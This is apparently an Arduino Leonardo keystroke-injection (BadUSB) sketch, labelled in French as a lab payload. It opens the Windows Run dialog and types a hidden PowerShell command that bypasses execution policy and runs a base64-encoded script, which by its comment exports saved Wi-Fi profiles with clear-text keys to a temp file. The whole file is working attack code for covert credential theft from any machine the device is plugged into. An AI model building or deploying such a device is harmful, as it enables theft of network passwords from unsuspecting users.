// Payload lab : export profils Wi‑Fi (clés en clair dans XML) + Notepad %TEMP%\wifi-leonardo.txt
// Layout : AZERTY / QWERTY via layout_config.h (detect-keyboard-layout.ps1 au flash).
#include "layout_config.h"
#include <Keyboard.h>
#include "wifi_ps_b64.h"

static const char PS_LAUNCH[] =
    "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand ";

static const uint16_t PRE_DELAY_MS = 4000;
static const uint16_t POST_ENTER_MS = 500;

static void openRunDialog() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(80);
  Keyboard.releaseAll();
  delay(600);
}

void setup() {
  keyboardBegin(TARGET_LAYOUT);
  delay(PRE_DELAY_MS);

  openRunDialog();
  typeString(PS_LAUNCH, TARGET_LAYOUT);
  typeStringPgm(WIFI_PS_B64, TARGET_LAYOUT);
  Keyboard.write(KEY_RETURN);
  delay(POST_ENTER_MS);
  Keyboard.releaseAll();
}

void loop() {}